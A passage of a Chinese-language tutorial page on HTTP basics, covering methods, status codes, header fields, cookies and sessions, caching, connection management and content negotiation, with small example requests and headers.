href="#首部压缩">首部压缩</a></li></ul></li><li><a href="#参考资料">参考资料</a><!-- GFM-TOC --></li></ul><h1 id="一-、基础概念"><a href="#一-、基础概念" class="headerlink" title="一 、基础概念"></a>一 、基础概念</h1><h2 id="Web-基础"><a href="#Web-基础" class="headerlink" title="Web 基础"></a>Web 基础</h2><ul><li>WWW（World Wide Web）的三种技术：HTML、HTTP、URL</li><li>HTML（HyperText Markup Language，超文本标记语言）</li><li>HTTP（HyperText Transfer Protocol，超文本传输协议）</li><li>RFC（Request for Comments，征求修正意见书），互联网的设计文档。</li></ul><h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li>URI（Uniform Resource Indentifier，统一资源标识符）</li><li>URL（Uniform Resource Locator，统一资源定位符）</li><li>URN（Uniform Resource Name，统一资源名称），例如 urn:isbn:0-486-27557-4。</li></ul><p>URI 包含 URL 和 URN，目前 WEB 只有 URL 比较流行，所以见到的基本都是 URL。</p><p><div align="center"> <img src="/images/posts/f716427a-94f2-4875-9c86-98793cf5dcc3.jpg" width="400"> </div><br></p><h2 id="请求和响应报文"><a href="#请求和响应报文" class="headerlink" title="请求和响应报文"></a>请求和响应报文</h2><h3 id="1-请求报文"><a href="#1-请求报文" class="headerlink" title="1. 请求报文"></a>1. 请求报文</h3><p><div align="center"> <img src="/images/posts/HTTP_RequestMessageExample.png" width=""> </div><br></p><h3 id="2-响应报文"><a href="#2-响应报文" class="headerlink" title="2. 响应报文"></a>2. 响应报文</h3><p><div align="center"> <img src="/images/posts/HTTP_ResponseMessageExample.png" width=""> </div><br></p><h1 id="二、HTTP-方法"><a href="#二、HTTP-方法" class="headerlink" title="二、HTTP 方法"></a>二、HTTP 方法</h1><p>客户端发送的  <strong>请求报文</strong>  第一行为请求行，包含了方法字段。</p><h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><blockquote><p>获取资源</p></blockquote><p>当前网络请求中，绝大部分使用的是 GET 方法。</p><h2 id="HEAD"><a href="#HEAD" class="headerlink" title="HEAD"></a>HEAD</h2><blockquote><p>获取报文首部</p></blockquote><p>和 GET 方法一样，但是不返回报文实体主体部分。</p><p>主要用于确认 URL 的有效性以及资源更新的日期时间等。</p><h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><blockquote><p>传输实体主体</p></blockquote><p>POST 主要用来传输数据，而 GET 主要用来获取资源。</p><p>更多 POST 与 GET 的比较请见第八章。</p><h2 id="PUT"><a href="#PUT" class="headerlink" title="PUT"></a>PUT</h2><blockquote><p>上传文件</p></blockquote><p>由于自身不带验证机制，任何人都可以上传文件，因此存在安全性问题，一般不使用该方法。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PUT /new.html HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Content-type: text/html</span><br><span class="line">Content-length: 16</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>New File<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="PATCH"><a href="#PATCH" class="headerlink" title="PATCH"></a>PATCH</h2><blockquote><p>对资源进行部分修改</p></blockquote><p>PUT 也可以用于修改资源，但是只能完全替代原始资源，PATCH 允许部分修改。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PATCH /file.txt HTTP/1.1</span><br><span class="line">Host: www.example.com</span><br><span class="line">Content-Type: application/example</span><br><span class="line">If-Match: "e0023aa4e"</span><br><span class="line">Content-Length: 100</span><br><span class="line"></span><br><span class="line">[description of changes]</span><br></pre></td></tr></table></figure><h2 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h2><blockquote><p>删除文件</p></blockquote><p>与 PUT 功能相反，并且同样不带验证机制。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE /file.html HTTP/1.1</span><br></pre></td></tr></table></figure><h2 id="OPTIONS"><a href="#OPTIONS" class="headerlink" title="OPTIONS"></a>OPTIONS</h2><blockquote><p>查询支持的方法</p></blockquote><p>查询指定的 URL 能够支持的方法。</p><p>会返回 Allow: GET, POST, HEAD, OPTIONS 这样的内容。</p><h2 id="CONNECT"><a href="#CONNECT" class="headerlink" title="CONNECT"></a>CONNECT</h2><blockquote><p>要求用隧道协议连接代理</p></blockquote><p>要求在与代理服务器通信时建立隧道，使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONNECT www.example.com:443 HTTP/1.1</span><br></pre></td></tr></table></figure><p><div align="center"> <img src="/images/posts/dc00f70e-c5c8-4d20-baf1-2d70014a97e3.jpg" width=""> </div><br></p><h2 id="TRACE"><a href="#TRACE" class="headerlink" title="TRACE"></a>TRACE</h2><blockquote><p>追踪路径</p></blockquote><p>服务器会将通信路径返回给客户端。</p><p>发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服务器就会减 1，当数值为 0 时就停止传输。</p><p>通常不会使用 TRACE，并且它容易受到 XST 攻击（Cross-Site Tracing，跨站追踪），因此更不会去使用它。</p><h1 id="三、HTTP-状态码"><a href="#三、HTTP-状态码" class="headerlink" title="三、HTTP 状态码"></a>三、HTTP 状态码</h1><p>服务器返回的  <strong>响应报文</strong>  中第一行为状态行，包含了状态码以及原因短语，用来告知客户端请求的结果。</p><table><thead><tr><th style="text-align:center">状态码</th><th style="text-align:center">类别</th><th style="text-align:center">原因短语</th></tr></thead><tbody><tr><td style="text-align:center">1XX</td><td style="text-align:center">Informational（信息性状态码）</td><td style="text-align:center">接收的请求正在处理</td></tr><tr><td style="text-align:center">2XX</td><td style="text-align:center">Success（成功状态码）</td><td style="text-align:center">请求正常处理完毕</td></tr><tr><td style="text-align:center">3XX</td><td style="text-align:center">Redirection（重定向状态码）</td><td style="text-align:center">需要进行附加操作以完成请求</td></tr><tr><td style="text-align:center">4XX</td><td style="text-align:center">Client Error（客户端错误状态码）</td><td style="text-align:center">服务器无法处理请求</td></tr><tr><td style="text-align:center">5XX</td><td style="text-align:center">Server Error（服务器错误状态码）</td><td style="text-align:center">服务器处理请求出错</td></tr></tbody></table><h2 id="1XX-信息"><a href="#1XX-信息" class="headerlink" title="1XX 信息"></a>1XX 信息</h2><ul><li><strong>100 Continue</strong> ：表明到目前为止都很正常，客户端可以继续发送请求或者忽略这个响应。</li></ul><h2 id="2XX-成功"><a href="#2XX-成功" class="headerlink" title="2XX 成功"></a>2XX 成功</h2><ul><li><p><strong>200 OK</strong> </p></li><li><p><strong>204 No Content</strong> ：请求已经成功处理，但是返回的响应报文不包含实体的主体部分。一般在只需要从客户端往服务器发送信息，而不需要返回数据时使用。</p></li><li><p><strong>206 Partial Content</strong> ：表示客户端进行了范围请求。响应报文包含由 Content-Range 指定范围的实体内容。</p></li></ul><h2 id="3XX-重定向"><a href="#3XX-重定向" class="headerlink" title="3XX 重定向"></a>3XX 重定向</h2><ul><li><p><strong>301 Moved Permanently</strong> ：永久性重定向</p></li><li><p><strong>302 Found</strong> ：临时性重定向</p></li><li><p><strong>303 See Other</strong> ：和 302 有着相同的功能，但是 303 明确要求客户端应该采用 GET 方法获取资源。</p></li><li><p>注：虽然 HTTP 协议规定 301、302 状态下重定向时不允许把 POST 方法改成 GET 方法，但是大多数浏览器都会在 301、302 和 303 状态下的重定向把 POST 方法改成 GET 方法。</p></li><li><p><strong>304 Not Modified</strong> ：如果请求报文首部包含一些条件，例如：If-Match，If-ModifiedSince，If-None-Match，If-Range，If-Unmodified-Since，如果不满足条件，则服务器会返回 304 状态码。</p></li><li><p><strong>307 Temporary Redirect</strong> ：临时重定向，与 302 的含义类似，但是 307 要求浏览器不会把重定向请求的 POST 方法改成 GET 方法。</p></li></ul><h2 id="4XX-客户端错误"><a href="#4XX-客户端错误" class="headerlink" title="4XX 客户端错误"></a>4XX 客户端错误</h2><ul><li><p><strong>400 Bad Request</strong> ：请求报文中存在语法错误。</p></li><li><p><strong>401 Unauthorized</strong> ：该状态码表示发送的请求需要有认证信息（BASIC 认证、DIGEST 认证）。如果之前已进行过一次请求，则表示用户认证失败。</p></li><li><p><strong>403 Forbidden</strong> ：请求被拒绝，服务器端没有必要给出拒绝的详细理由。</p></li><li><p><strong>404 Not Found</strong> </p></li></ul><h2 id="5XX-服务器错误"><a href="#5XX-服务器错误" class="headerlink" title="5XX 服务器错误"></a>5XX 服务器错误</h2><ul><li><p><strong>500 Internal Server Error</strong> ：服务器正在执行请求时发生错误。</p></li><li><p><strong>502 Bad Gateway</strong> ：是指错误网关，无效网关；在互联网中表示一种网络错误。</p></li><li><p><strong>503 Service Unavilable</strong> ：服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。</p></li></ul><h1 id="四、HTTP-首部"><a href="#四、HTTP-首部" class="headerlink" title="四、HTTP 首部"></a>四、HTTP 首部</h1><p>有 4 种类型的首部字段：通用首部字段、请求首部字段、响应首部字段和实体首部字段。</p><p>各种首部字段及其含义如下（不需要全记，仅供查阅）：</p><h2 id="通用首部字段"><a href="#通用首部字段" class="headerlink" title="通用首部字段"></a>通用首部字段</h2><table><thead><tr><th style="text-align:center">首部字段名</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">Cache-Control</td><td style="text-align:center">控制缓存的行为</td></tr><tr><td style="text-align:center">Connection</td><td style="text-align:center">控制不再转发给代理的首部字段、管理持久连接</td></tr><tr><td style="text-align:center">Date</td><td style="text-align:center">创建报文的日期时间</td></tr><tr><td style="text-align:center">Pragma</td><td style="text-align:center">报文指令</td></tr><tr><td style="text-align:center">Trailer</td><td style="text-align:center">报文末端的首部一览</td></tr><tr><td style="text-align:center">Transfer-Encoding</td><td style="text-align:center">指定报文主体的传输编码方式</td></tr><tr><td style="text-align:center">Upgrade</td><td style="text-align:center">升级为其他协议</td></tr><tr><td style="text-align:center">Via</td><td style="text-align:center">代理服务器的相关信息</td></tr><tr><td style="text-align:center">Warning</td><td style="text-align:center">错误通知</td></tr></tbody></table><h2 id="请求首部字段"><a href="#请求首部字段" class="headerlink" title="请求首部字段"></a>请求首部字段</h2><table><thead><tr><th style="text-align:center">首部字段名</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">Accept</td><td style="text-align:center">用户代理可处理的媒体类型</td></tr><tr><td style="text-align:center">Accept-Charset</td><td style="text-align:center">优先的字符集</td></tr><tr><td style="text-align:center">Accept-Encoding</td><td style="text-align:center">优先的内容编码</td></tr><tr><td style="text-align:center">Accept-Language</td><td style="text-align:center">优先的语言（自然语言）</td></tr><tr><td style="text-align:center">Authorization</td><td style="text-align:center">Web 认证信息</td></tr><tr><td style="text-align:center">Expect</td><td style="text-align:center">期待服务器的特定行为</td></tr><tr><td style="text-align:center">From</td><td style="text-align:center">用户的电子邮箱地址</td></tr><tr><td style="text-align:center">Host</td><td style="text-align:center">请求资源所在服务器</td></tr><tr><td style="text-align:center">If-Match</td><td style="text-align:center">比较实体标记（ETag）</td></tr><tr><td style="text-align:center">If-Modified-Since</td><td style="text-align:center">比较资源的更新时间</td></tr><tr><td style="text-align:center">If-None-Match</td><td style="text-align:center">比较实体标记（与 If-Match 相反）</td></tr><tr><td style="text-align:center">If-Range</td><td style="text-align:center">资源未更新时发送实体 Byte 的范围请求</td></tr><tr><td style="text-align:center">If-Unmodified-Since</td><td style="text-align:center">比较资源的更新时间（与 If-Modified-Since 相反）</td></tr><tr><td style="text-align:center">Max-Forwards</td><td style="text-align:center">最大传输逐跳数</td></tr><tr><td style="text-align:center">Proxy-Authorization</td><td style="text-align:center">代理服务器要求客户端的认证信息</td></tr><tr><td style="text-align:center">Range</td><td style="text-align:center">实体的字节范围请求</td></tr><tr><td style="text-align:center">Referer</td><td style="text-align:center">对请求中 URI 的原始获取方</td></tr><tr><td style="text-align:center">TE</td><td style="text-align:center">传输编码的优先级</td></tr><tr><td style="text-align:center">User-Agent</td><td style="text-align:center">HTTP 客户端程序的信息</td></tr></tbody></table><h2 id="响应首部字段"><a href="#响应首部字段" class="headerlink" title="响应首部字段"></a>响应首部字段</h2><table><thead><tr><th style="text-align:center">首部字段名</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">Accept-Ranges</td><td style="text-align:center">是否接受字节范围请求</td></tr><tr><td style="text-align:center">Age</td><td style="text-align:center">推算资源创建经过时间</td></tr><tr><td style="text-align:center">ETag</td><td style="text-align:center">资源的匹配信息</td></tr><tr><td style="text-align:center">Location</td><td style="text-align:center">令客户端重定向至指定 URI</td></tr><tr><td style="text-align:center">Proxy-Authenticate</td><td style="text-align:center">代理服务器对客户端的认证信息</td></tr><tr><td style="text-align:center">Retry-After</td><td style="text-align:center">对再次发起请求的时机要求</td></tr><tr><td style="text-align:center">Server</td><td style="text-align:center">HTTP 服务器的安装信息</td></tr><tr><td style="text-align:center">Vary</td><td style="text-align:center">代理服务器缓存的管理信息</td></tr><tr><td style="text-align:center">WWW-Authenticate</td><td style="text-align:center">服务器对客户端的认证信息</td></tr></tbody></table><h2 id="实体首部字段"><a href="#实体首部字段" class="headerlink" title="实体首部字段"></a>实体首部字段</h2><table><thead><tr><th style="text-align:center">首部字段名</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">Allow</td><td style="text-align:center">资源可支持的 HTTP 方法</td></tr><tr><td style="text-align:center">Content-Encoding</td><td style="text-align:center">实体主体适用的编码方式</td></tr><tr><td style="text-align:center">Content-Language</td><td style="text-align:center">实体主体的自然语言</td></tr><tr><td style="text-align:center">Content-Length</td><td style="text-align:center">实体主体的大小</td></tr><tr><td style="text-align:center">Content-Location</td><td style="text-align:center">替代对应资源的 URI</td></tr><tr><td style="text-align:center">Content-MD5</td><td style="text-align:center">实体主体的报文摘要</td></tr><tr><td style="text-align:center">Content-Range</td><td style="text-align:center">实体主体的位置范围</td></tr><tr><td style="text-align:center">Content-Type</td><td style="text-align:center">实体主体的媒体类型</td></tr><tr><td style="text-align:center">Expires</td><td style="text-align:center">实体主体过期的日期时间</td></tr><tr><td style="text-align:center">Last-Modified</td><td style="text-align:center">资源的最后修改日期时间</td></tr></tbody></table><h1 id="五、具体应用"><a href="#五、具体应用" class="headerlink" title="五、具体应用"></a>五、具体应用</h1><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>HTTP 协议是无状态的，主要是为了让 HTTP 协议尽可能简单，使得它能够处理大量事务。HTTP/1.1 引入 Cookie 来保存状态信息。</p><p>Cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。</p><h3 id="1-用途"><a href="#1-用途" class="headerlink" title="1. 用途"></a>1. 用途</h3><ul><li>会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）</li><li>个性化设置（如用户自定义设置、主题等）</li><li>浏览器行为跟踪（如跟踪分析用户行为等）</li></ul><p>Cookie 曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 Web storage API （本地存储和会话存储）或 IndexedDB。</p><h3 id="2-创建过程"><a href="#2-创建过程" class="headerlink" title="2. 创建过程"></a>2. 创建过程</h3><p>服务器发送的响应报文包含 Set-Cookie 首部字段，客户端得到响应报文后把 Cookie 内容保存到浏览器中。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-type: text/html</span><br><span class="line">Set-Cookie: yummy_cookie=choco</span><br><span class="line">Set-Cookie: tasty_cookie=strawberry</span><br><span class="line"></span><br><span class="line">[page content]</span><br></pre></td></tr></table></figure><p>客户端之后对同一个服务器发送请求时，会从浏览器中读出 Cookie 信息通过 Cookie 请求首部字段发送给服务器。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /sample_page.html HTTP/1.1</span><br><span class="line">Host: www.example.org</span><br><span class="line">Cookie: yummy_cookie=choco; tasty_cookie=strawberry</span><br></pre></td></tr></table></figure><h3 id="3-分类"><a href="#3-分类" class="headerlink" title="3. 分类"></a>3. 分类</h3><ul><li>会话期 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。</li><li>持久性 Cookie：指定一个特定的过期时间（Expires）或有效期（Max-Age）之后就成为了持久性的 Cookie。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</span><br></pre></td></tr></table></figure><h3 id="4-JavaScript-获取-Cookie"><a href="#4-JavaScript-获取-Cookie" class="headerlink" title="4. JavaScript 获取 Cookie"></a>4. JavaScript 获取 Cookie</h3><p>通过 <code>Document.cookie</code> 属性可创建新的 Cookie，也可通过该属性访问非 HttpOnly 标记的 Cookie。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document.cookie = "yummy_cookie=choco";</span><br><span class="line">document.cookie = "tasty_cookie=strawberry";</span><br><span class="line">console.log(document.cookie);</span><br></pre></td></tr></table></figure><h3 id="5-Secure-和-HttpOnly"><a href="#5-Secure-和-HttpOnly" class="headerlink" title="5. Secure 和 HttpOnly"></a>5. Secure 和 HttpOnly</h3><p>标记为 Secure 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端。但即便设置了 Secure 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，Secure 标记也无法提供确实的安全保障。</p><p>标记为 HttpOnly 的 Cookie 不能被 JavaScript 脚本调用。因为跨域脚本 (XSS) 攻击常常使用 JavaScript 的 <code>Document.cookie</code> API 窃取用户的 Cookie 信息，因此使用 HttpOnly 标记可以在一定程度上避免 XSS 攻击。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</span><br></pre></td></tr></table></figure><h3 id="6-作用域"><a href="#6-作用域" class="headerlink" title="6. 作用域"></a>6. 作用域</h3><p>Domain 标识指定了哪些主机可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了 Domain，则一般包含子域名。例如，如果设置 Domain=mozilla.org，则 Cookie 也包含在子域名中（如 developer.mozilla.org）。</p><p>Path 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 %x2F (“/“) 作为路径分隔符，子路径也会被匹配。例如，设置 Path=/docs，则以下地址都会匹配：</p><ul><li>/docs</li><li>/docs/Web/</li><li>/docs/Web/HTTP</li></ul><h3 id="7-Session"><a href="#7-Session" class="headerlink" title="7. Session"></a>7. Session</h3><p>除了可以将用户信息通过 Cookie 存储在用户浏览器中，也可以利用 Session 存储在服务器端，存储在服务器端的信息更加安全。</p><p>Session 可以存储在服务器上的文件、数据库或者内存中，现在最常见的是将 Session 存储在内存型数据库中，比如 Redis。</p><p>使用 Session 维护用户登录的过程如下：</p><ul><li>用户进行登录时，用户提交包含用户名和密码的表单，放入 HTTP 请求报文中；</li><li>服务器验证该用户名和密码；</li><li>如果正确则把用户信息存储到 Redis 中，它在 Redis 中的 ID 称为 Session ID；</li><li>服务器返回的响应报文的 Set-Cookie 首部字段包含了这个 Session ID，客户端收到响应报文之后将该 Cookie 值存入浏览器中；</li><li>客户端之后对同一个服务器进行请求时会包含该 Cookie 值，服务器收到之后提取出 Session ID，从 Redis 中取出用户信息，继续之后的业务操作。</li></ul><p>应该注意 Session ID 的安全性问题，不能让它被恶意攻击者轻易获取，那么就不能生产一个容易被才到的 Session ID 值。此外，还需要经常重新生成 Session ID。在对安全性要求极高的场景下，例如转账等操作，除了使用 Session 管理用户状态之外，还需要对用户进行重新验证，比如重新输入密码，或者使用短信验证码等方式。</p><h3 id="8-浏览器禁用-Cookie"><a href="#8-浏览器禁用-Cookie" class="headerlink" title="8. 浏览器禁用 Cookie"></a>8. 浏览器禁用 Cookie</h3><p>此时无法使用 Cookie 来保存用户信息，只能使用 Session。除此之外，不能再将 Session ID 存放到 Cookie 中，而是使用 URL 重写技术，将 Session ID 作为 URL 的参数进行传递。</p><h3 id="9-Cookie-与-Session-选择"><a href="#9-Cookie-与-Session-选择" class="headerlink" title="9. Cookie 与 Session 选择"></a>9. Cookie 与 Session 选择</h3><ul><li>Cookie 只能存储 ASCII 码字符串，而 Session 则可以存取任何类型的数据，因此在考虑数据复杂性时 首选 Session；</li><li>Cookie 存储在浏览器中，容易被恶意查看。如果非要将一些隐私数据存在 Cookie 中，可以将 Cookie 值进行加密，然后在服务器进行解密；</li><li>对于大型网站，如果用户所有的信息都存储在 Session 中，那么开销是非常大的，因此不建议将所有的用户信息都存储到 Session 中。</li></ul><h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><h3 id="1-优点"><a href="#1-优点" class="headerlink" title="1. 优点"></a>1. 优点</h3><ul><li>缓解服务器压力；</li><li>减低客户端获取资源的延迟（缓存资源比服务器上的资源离客户端更近）。</li></ul><h3 id="2-实现方法"><a href="#2-实现方法" class="headerlink" title="2. 实现方法"></a>2. 实现方法</h3><ol><li>让代理服务器进行缓存；</li><li>让客户端浏览器进行缓存。</li></ol><h3 id="3-Cache-Control"><a href="#3-Cache-Control" class="headerlink" title="3. Cache-Control"></a>3. Cache-Control</h3><p>HTTP/1.1 通过 Cache-Control 首部字段来控制缓存。</p><p>（一）禁止进行缓存</p><p>no-store 指令规定不能对请求或响应的任何一部分进行缓存。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cache-Control: no-store</span><br></pre></td></tr></table></figure><p>（二）强制确认缓存</p><p>no-cache 指令规定缓存服务器需要先向源服务器验证缓存资源的有效性，只有当缓存资源有效才将能使用该缓存对客户端的请求进行响应。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cache-Control: no-cache</span><br></pre></td></tr></table></figure><p>（三）私有缓存和公共缓存</p><p>private 指定规定了可以将资源作为私有缓存，只能被单独用户所使用，一般存储在用户浏览器中。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cache-Control: private</span><br></pre></td></tr></table></figure><p>public 指令规定了可以将资源作为公共缓存，可以被多个用户所使用，一般存在在代理服务器中。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cache-Control: public</span><br></pre></td></tr></table></figure><p>（四）缓存过期机制</p><p>max-age 指令出现在请求报文中，并且缓存资源的缓存时间小于该指令指定的时间，那么就能接受该缓存。</p><p>max-age  指令出现在响应报文中，表示缓存资源在缓存服务器中保存的时间。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cache-Control: max-age=31536000</span><br></pre></td></tr></table></figure><p>Expires 字段也可以用于告知缓存服务器该资源什么时候会过期。在 HTTP/1.1 中，会优先处理 Cache-Control : max-age 指令；而在 HTTP/1.0 中，Cache-Control : max-age 指令会被忽略掉。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Expires: Wed, 04 Jul 2012 08:26:05 GMT</span><br></pre></td></tr></table></figure><h3 id="4-缓存验证"><a href="#4-缓存验证" class="headerlink" title="4. 缓存验证"></a>4. 缓存验证</h3><p>需要先了解 ETag 首部字段的含义，它是资源的唯一表示。URL 不能唯一表示资源，例如 <code>http://www.google.com/</code> 有中文和英文两个资源，只有 ETag 才能对这两个资源进行唯一表示。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ETag: "82e22293907ce725faf67773957acd12"</span><br></pre></td></tr></table></figure><p>可以将缓存资源的 ETag 值放入 If-None-Match 首部，服务器收到该请求后，判断缓存资源的 ETag 值和资源的最新 ETag 值是否一致，如果一致则表示缓存资源有效，返回  304 Not Modified。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If-None-Match: "82e22293907ce725faf67773957acd12"</span><br></pre></td></tr></table></figure><p>Last-Modified 首部字段也可以用于缓存验证，它包含在源服务器发送的响应报文中，指示源服务器对资源的最后修改时间。但是它是一种弱校验器，因为只能精确到一秒，所以它通常作为 ETag 的备用方案。</p><p>如果响应首部字段里含有这个信息，客户端可以在后续的请求中带上 If-Modified-Since 来验证缓存。服务器只在所请求的资源在给定的日期时间之后对内容进行过修改的情况下才会将资源返回，状态码为 200 OK。如果请求的资源从那时起未经修改，那么返回一个不带有消息主体的 304 Not Modified 响应，</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Last-Modified: Wed, 21 Oct 2015 07:28:00 GMT</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If-Modified-Since: Wed, 21 Oct 2015 07:28:00 GMT</span><br></pre></td></tr></table></figure><h2 id="连接管理"><a href="#连接管理" class="headerlink" title="连接管理"></a>连接管理</h2><p><div align="center"> <img src="/images/posts/HTTP1_x_Connections.png" width="800"> </div><br></p><h3 id="1-短连接与长连接"><a href="#1-短连接与长连接" class="headerlink" title="1. 短连接与长连接"></a>1. 短连接与长连接</h3><p>当浏览器访问一个包含多张图片的 HTML 页面时，除了请求访问 HTML 页面资源，还会请求图片资源，如果每进行一次 HTTP 通信就要断开一次 TCP 连接，连接建立和断开的开销会很大。长连接只需要建立一次 TCP 连接就能进行多次 HTTP 通信。</p><p>HTTP/1.1 开始默认是长连接的，如果要断开连接，需要由客户端或者服务器端提出断开，使用 Connection : close；而在 HTTP/1.1 之前默认是短连接的，如果需要长连接，则使用 Connection : Keep-Alive。</p><h3 id="2-流水线"><a href="#2-流水线" class="headerlink" title="2. 流水线"></a>2. 流水线</h3><p>默认情况下，HTTP 请求是按顺序发出的，下一个请求只有在当前请求收到应答过后才会被发出。由于会受到网络延迟和带宽的限制，在下一个请求被发送到服务器之前，可能需要等待很长时间。流水线是在同一条长连接上发出连续的请求，而不用等待响应返回，这样可以避免连接延迟。</p><h2 id="内容协商"><a href="#内容协商" class="headerlink" title="内容协商"></a>内容协商</h2><p>通过内容协商返回最合适的内容，例如根据浏览器的默认语言选择返回中文界面还是英文界面。</p><h3 id="1-类型"><a href="#1-类型" class="headerlink" title="1. 类型"></a>1. 类型</h3><p>（一）服务端驱动型内容协商</p><p>客户端设置特定的 HTTP 首部字段，例如 Accept、Accept-Charset、Accept-Encoding、Accept-Language、Content-Languag，服务器根据这些字段返回特定的资源。</p><p>它存在以下问题：</p><ul><li>器对浏览器并非全知全能。即便是有了客户端示意扩展，也依然无法获取关于浏览器能力的全部信息。</li><li>端提供的信息相当冗长（HTTP/2 协议的首部压缩机制缓解了这个问题），并且存在隐私风险（HTTP 指纹识别技术）。</li><li>给定的资源需要返回不同的展现形式，共享缓存的效率会降低，而服务器端的实现会越来越复杂。</li></ul><p>（二）代理驱动型协商</p><p>服务器返回 300 Multiple Choices 或者 406 Not Acceptable，客户端从中选出最合适的那个资源。</p><h3 id="2-Vary"><a href="#2-Vary" class="headerlink" title="2. Vary"></a>2. Vary</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vary: Accept-Language</span><br></pre></td></tr></table></figure><p>在使用内容协商的情况下，只有当缓存服务器中的缓存满足内容协商条件时，才能使用该缓存，否则应该向源服务器请求该资源。</p><p>例如，一个客户端发送了一个包含 Accept-Language  首部字段的请求之后，源服务器返回的响应包含 <code>Vary: Accept-Language</code> 内容，缓存服务器对这个响应进行缓存之后，在客户端下一次访问同一个 URL 资源，并且 Accept-Language 与缓存中的对应的值相同时才会返回该缓存。</p><h2 id="内容编码"><a href="#内容编码" class="headerlink" title="内容编码"></a>内容编码</h2><p>内容编码将实体主体进行压缩，从而减少传输的数据量。常用的内容编码有：gzip、compress、deflate、identity。</p><p>浏览器发送 Accept-Encoding 首部，其中包含有它所支持的压缩算法，以及各自的优先级，服务器则从中选择一种，使用该算法对响应的消息主体进行压缩，并且发送 Content-Encoding 首部来告知浏览器它选择了哪一种算法。由于该内容协商过程是基于编码类型来选择资源的展现形式的，在响应中， Vary 首部中至少要包含 Content-Encoding 